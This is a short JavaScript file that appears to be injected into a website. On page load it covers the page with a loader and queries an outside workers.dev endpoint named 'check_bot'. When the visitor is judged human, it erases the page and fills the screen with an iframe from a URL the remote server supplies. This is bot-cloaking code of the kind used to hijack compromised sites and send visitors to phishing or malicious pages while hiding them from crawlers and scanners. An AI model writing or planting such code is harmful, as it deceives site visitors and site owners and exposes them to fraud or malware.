
function createLoader() {
  const frame = document.createElement('iframe');
  frame.id = 'load_frame';
  frame.src = `frameLoad.html`;
  frame.frameBorder = 0;
  frame.width = '100%';
  frame.height = '100%';
  frame.style.position = 'fixed';
  frame.style.top = 0;
  frame.style.left = 0;
  frame.style.width = '100%';
  frame.style.height = '100%';
  frame.style.zIndex = 9999;
  frame.style.background = '#fff';
  document.body.appendChild(frame);
}

function removeLoader() {
  const loadFrame = document.querySelector('#load_frame');
  if (loadFrame) loadFrame.remove();
}

function showBlackFrame(blackUrl) {
  document.body.innerHTML = ''; 
  document.body.style.margin = '0';
  document.body.style.padding = '0';
  document.body.style.overflow = 'hidden';

  const frame = document.createElement('iframe');
  frame.setAttribute('src', blackUrl);
  frame.setAttribute('id', 'wrapper_frame');
  frame.style = `
    width: 100vw;
    height: 100vh;
    border: none;
    display: block;
  `;

  document.body.appendChild(frame);

  const style = document.createElement('style');
  style.innerHTML = `
    @media only screen and (max-width: 768px) {
      #wrapper_frame { height: 50vh; }
    }
    @media only screen and (max-width: 480px) {
      #wrapper_frame { height: 30vh; }
    }
  `;
  document.head.appendChild(style);
}

window.addEventListener('DOMContentLoaded', () => {
  createLoader() 

  fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
    .then(res => res.json())
    .then(res => {
      if (res?.code === 200 && !res.result) {
       
        showBlackFrame(res.url + '/nf5nPY3n');
      }
      
      setTimeout(removeLoader, 500);
    })
    .catch(err => {
      console.error("Ошибка запроса:", err);
      removeLoader(); 
    });
});


